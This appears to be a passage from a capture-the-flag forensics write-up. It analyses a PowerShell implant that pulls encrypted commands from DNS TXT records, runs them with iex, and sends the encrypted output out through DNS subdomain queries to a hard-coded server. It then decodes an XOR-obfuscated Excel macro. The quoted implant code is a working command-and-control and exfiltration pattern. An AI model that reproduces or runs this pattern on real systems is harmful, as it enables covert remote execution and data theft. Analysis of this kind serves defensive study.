"BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0="

"vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A="

"M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
```

Now I went back to the script and the following section is related with the above base64 stuff…

```powershell
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;
```

- It’s fetching TXT records from the domain with a specific server for resolving it
- in a for loop each base64 response is decrypted
- then its executed in the last line

So I modified the script to output the decrypted part…

```powershell
$out = "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=", "hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=", "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=", "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru", "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=", "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=", "M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
for ($num = 0 ; $num -le $out.Length-1; $num++){
    $encryptedString = $out[$num]
    $backToPlainText = Decrypt-String $key $encryptedString
    echo "$backToPlainText"
}
```

here `out` is an array of base64 strings and then the same for loop…

![](https://i.imgur.com/CmAj7fo.png)

so these are set of commands which are decrypted and executed. In the 5th command we have some more base64 stuff and on decoding it we get part one of flag…

![](https://i.imgur.com/COJT0Bq.png)

Now lets proceed to next section of the code…

```powershell
$output = iex $backToPlainText;
$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}%
```

- the output of those command is encrypted and split to 32 chars, if the output is longer it goes to next line and so on
- then it iterates over the encrypted strings and makes more DNS queries
- before start of loop it makes a query to `start.windowsliveupdater.com` and at the end of loop it queries `end.windowsliveupdater.com` so this makes it easy to get the order in wireshark

so first i extracted list of these subdomains using `tshark` :

```bash
tshark -nr capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
```

![](https://i.imgur.com/AIEeHH7.png)

here is the result and for ease of reading I have separated the sections and removed other extra queries :

```
start.windowsliveupdater.com
CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com
32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com
C1006AC8A03F9776B08321BD6D5247BB.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
7679895D1CF7C07BB6A348E1AA4AFC65.windowsliveupdater.com
5958A6856F1A34AAD5E97EA55B087670.windowsliveupdater.com
35F2497E5836EA0ECA1F1280F59742A3.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
09E28DD82C14BC32513652DAC2F2C27B.windowsliveupdater.com
0D73A3288A980D8FCEF94BDDCF9E2822.windowsliveupdater.com
2A1CA17BB2D90FCD6158856348790414.windowsliveupdater.com
20FC39C684A9E371CC3A06542B666005.windowsliveupdater.com
5840BD94CCE65E23613925B4D9D2BA53.windowsliveupdater.com
18EA75BC653004D45D505ED62567017A.windowsliveupdater.com
6FA4E7593D83092F67A81082D9930E99.windowsliveupdater.com
BA20E34AACC4774F067442C6622F5DA2.windowsliveupdater.com
A9B09FF558A8DF000ECBD37804CE663E.windowsliveupdater.com
3521599BC7591005AB6799C57068CF0D.windowsliveupdater.com
C6884CECF01C0CD44FD6B82DB788B35D.windowsliveupdater.com
62F02E4CAA1D973FBECC235AE9F40254.windowsliveupdater.com
C63D3C93C89930DA2C4F42D9FC123D8B.windowsliveupdater.com
AB00ACAB5198AFCC8C6ACD81B19CD264.windowsliveupdater.com
CC6353668CEA4C88C8AEEA1D58980022.windowsliveupdater.com
DA8FA2E917F17C28608818BF550FEA66.windowsliveupdater.com
973B5A8355258AB0AA281AD88F5B9EB1.windowsliveupdater.com
03AC666FE09A1D449736335C09484D27.windowsliveupdater.com
1C301C6D5780AB2C9FA333BE3B0185BF.windowsliveupdater.com
071FB1205C4DBEAA2241168B0748902A.windowsliveupdater.com
6CE14903C7C47E7C87311044CB9873A4.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
ECABC349D27C0B0FFFD1ACEEDBE06BB6.windowsliveupdater.com
C2EB000EE4F9B35D6F001500E85642A2.windowsliveupdater.com
DCC8F1BE2CF4D667F458C1DE46D24B1C.windowsliveupdater.com
2E0F5D94E52649C70402C1B0A2FF7B49.windowsliveupdater.com
FC32DDD67F275307A74B2C4D0864B3F0.windowsliveupdater.com
486186DA9443EB747F717B3911C959DC.windowsliveupdater.com
7E300844D60655410C3988238E615D61.windowsliveupdater.com
6F33D27F63CE4D1E065A416911BC50D4.windowsliveupdater.com
58749599D2CB08DB561988EB2902E05D.windowsliveupdater.com
9886FDDAC2BED6F6DA73637AD2F20CF1.windowsliveupdater.com
99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
99B8CE3D9DEE03C0180C7D1198B49C02.windowsliveupdater.com
769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
769E5EE4EAB896D7D3BB478EA1408167.windowsliveupdater.com
79472A243BFB0852AF372323EC132988.windowsliveupdater.com
3C81A3F2AEB1D3DAAE8496E1DBF97F43.windowsliveupdater.com
5AE40A09203B890C4A174D77CB7026C4.windowsliveupdater.com
E990A6FB6424A7501823AD31D3D6B634.windowsliveupdater.com
4C7971C8D447C078C4471732AD881C39.windowsliveupdater.com
4BC8B1A66E0BED43DDC359269B57D1D5.windowsliveupdater.com
D68DCD2A608BF61716BB47D6FE4D5C9D.windowsliveupdater.com
6E8BB2981F214A8234B0DD0210CA96EB.windowsliveupdater.com
2D6322B0F7F3D748C4C9F8B80EFF5A69.windowsliveupdater.com
21A3D1A8621A49F4D29BC9851D25230B.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
841BDB4E9E5F8BF721B58E8308177B57.windowsliveupdater.com
2E9A015967DA5BF11AC9155FC2159C8F.windowsliveupdater.com
610CD82F818B4BDF5E48722DAF4BEEEB.windowsliveupdater.com
ABCE30583F503B484BF99020E28A1B8F.windowsliveupdater.com
282A23FEB3A21C3AD89882F5AC0DD3D5.windowsliveupdater.com
7D87875231652D0F4431EC37E51A09D5.windowsliveupdater.com
7E2854D11003AB6E2F4BFB4F7E2477DA.windowsliveupdater.com
A44FCA3BC6021777F03F139D458C0524.windowsliveupdater.com
end.windowsliveupdater.com

start.windowsliveupdater.com
AE4ABE8A3A88D21DEEA071A72D65A35E.windowsliveupdater.com
F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com
end.windowsliveupdater.com
```

I modified the decrypt function to decrypt these because the original one expects base64 input but these are hex :

```powershell
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function Decrypt-Part-2($key, $encryptedStringWithIV) {
    $bytes = [byte[]]::new($encryptedStringWithIV.Length / 2)
    For($i=0; $i -lt $encryptedStringWithIV.Length; $i+=2){
        $bytes[$i/2] = [convert]::ToByte($encryptedStringWithIV.Substring($i, 2), 16)
    }
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
```

first one is the original and then you can see the modified one, first it converts hex to bytes and then the steps are same.

I also added some more code to decrypt the subdomains, now since the original code splits the hex strings and makes multiple queries I concatenated the strings and made an array like in the first part and decrypted all of them in a loop :

```powershell
$cipher_arr = "CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB", "09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4", "7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3", "ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C0299B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA1408167769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B", "841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524", "AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833"
for ($num = 0 ; $num -le $cipher_arr.Length-1; $num++){
    $encryptedString = $cipher_arr[$num]
    $backToPlainText = Decrypt-Part-2 $key $encryptedString
    echo "$backToPlainText"
} 
```

here is the final script :

```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}
function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}
function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Decrypt-Part-2($key, $encryptedStringWithIV) {
    $bytes = [byte[]]::new($encryptedStringWithIV.Length / 2)
    For($i=0; $i -lt $encryptedStringWithIV.Length; $i+=2){
        $bytes[$i/2] = [convert]::ToByte($encryptedStringWithIV.Substring($i, 2), 16)
    }
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=", "hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=", "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=", "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru", "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=", "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=", "M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
for ($num = 0 ; $num -le $out.Length-1; $num++){
    $encryptedString = $out[$num]
    $backToPlainText = Decrypt-String $key $encryptedString
    echo "$backToPlainText"
}
$cipher_arr = "CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB", "09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4", "7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3", "ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C0299B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA1408167769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B", "841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524", "AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833"
for ($num = 0 ; $num -le $cipher_arr.Length-1; $num++){
    $encryptedString = $cipher_arr[$num]
    $backToPlainText = Decrypt-Part-2 $key $encryptedString
    echo "$backToPlainText"
}
```

final result :

![](https://i.imgur.com/ZT39bCs.png)

and we can see 2nd part of flag.

----------

## Free Services
> Solved By : Bobbysox, Legend, Starrylord, thewhiteh4t

We get a `xlsm` file in this one with the following content :

![](https://i.imgur.com/1W8qKgo.png)

since I opened the file in LibreOffice its showing `#NAME?` in cells for some reason otherwise in office it shows content properly, anyways in LibreOffice the actual content was visible in the formula bar above…

the interesting parts were the following :

```
=select(E1:G258)

=set.value(C1, 0)

=for("counter",0,772,2)

=set.value(B1,CHAR(BITXOR(active.cell(),24)))
```

this is basically a for loop from 0 to 772 with a step size of 2, step size means it will skip 2 items and jump forward every time, this loop iterated over the numbers present in columns E, F and G
and total numbers are 772

It was obvious to follow the script and that should show the flag but I got stuck due to how cells are numbered and how the increment in for loop but eventually i got it, the correct direction is :

```
E → F → G
next row
E → F → G
and so on
```

so from this I created a list of numbers and used a for loop with increment of step size 2 in python :

```python
values = [228,54,240,244,154,233,24,216,24,9,24,172,120,252,145,15,253,103,41,52,216,214,124,244,147,90,72,198,40,53,147,70,74,93,20,118,147,240,74,88,12,91,147,224,106,217,48,114,23,217,175,22,82,188,62,217,41,191,231,130,180,150,36,18,121,235,100,52,26,39,52,99,56,231,217,29,215,212,21,77,25,70,223,58,250,130,234,247,74,183,79,8,147,196,74,207,8,147,147,221,82,111,36,212,147,24,84,57,9,21,96,90,251,186,80,23,25,29,201,163,73,89,147,39,65,52,56,79,25,250,203,45,147,245,81,57,0,194,251,105,34,130,81,176,147,95,44,156,147,108,25,122,206,187,41,40,231,211,180,34,217,244,215,235,21,61,25,146,223,113,32,238,248,39,109,247,238,137,27,205,101,61,224,27,35,156,101,40,60,88,109,241,252,109,64,211,147,104,64,202,60,190,25,194,203,28,126,168,147,121,20,239,83,255,147,175,64,158,4,157,25,125,203,139,147,78,28,32,147,126,25,72,200,228,145,103,92,103,60,254,60,12,67,151,67,134,121,48,65,92,66,244,73,163,231,146,248,121,71,35,71,53,66,79,147,219,10,153,243,74,149,217,69,120,114,172,25,6,149,246,157,176,170,245,24,217,24,119,24,163,72,95,112,127,41,153,147,72,119,147,159,202,231,251,205,27,163,56,232,179,173,96,186,25,78,9,112,255,190,173,141,103,165,169,133,54,231,63,205,144,36,219,30,250,100,120,18,240,152,183,227,103,248,110,109,47,29,205,163,162,95,175,11,46,106,56,119,199,114,67,24,164,75,12,231,114,205,66,74,73,93,180,95,147,56,79,89,69,92,104,92,177,56,66,58,238,80,160,83,199,84,79,85,70,68,233,75,43,87,54,94,210,76,167,79,30,89,47,74,231,93,111,68,133,85,81,113,64,123,155,106,49,119,54,107,16,119,19,126,148,108,112,68,40,79,123,113,200,118,207,124,56,119,232,111,151,107,235,56,223,86,82,76,154,68,186,91,87,109,75,106,57,106,197,125,139,118,240,108,123,78,169,125,160,106,131,107,132,113,71,119,221,118,193,68,251,81,70,117,105,121,107,127,161,125,64,56,138,94,145,113,94,116,152,125,57,56,86,93,64,96,205,125,44,123,226,109,253,108,23,113,233,119,117,118,251,56,33,87,134,104,170,108,148,113,60,119,215,118,143,107,21,68,233,109,68,108,190,113,181,116,141,117,120,121,132,118,150,54,99,125,217,96,132,125,213,58,227,56,174,55,229,108,67,56,29,74,57,93,2,95,36,71,80,75,154,66,96,56,56,55,146,110,65,56,197,92,243,125,194,122,246,109,3,127,180,127,209,125,123,106,121,56,224,55,243,124,71,56,19,58,142,91,232,34,43,68,16,111,171,113,236,118,25,124,212,119,24,111,78,107,2,68,129,107,113,97,73,107,31,108,183,125,200,117,78,43,234,42,46,68,115,123,76,117,196,124,116,54,135,125,37,96,122,125,156,58,7,56,133,55,79,126,153,35,83,125,118,123,250,112,51,119,160,56,238,58,11,80,62,76,28,90,79,99,48,41,9,107,217,71,27,108,18,112,8,41,10,107,98,71,45,127,135,44,219,116,134,44,126,96,91,97,239,71,150,116,51,40,190,107,216,108,73,71,98,41,30,118,79,71,100,108,66,41,81,117,41,43,144,39,8,39,100,57,150,101,133,58,46,24,187]

flag = []

for val in values[0::2]:
    new_val = val ^ 24
    flag.append(chr(new_val))

print(''.join(flag))
```
result :

![](https://i.imgur.com/qVUaFdq.png)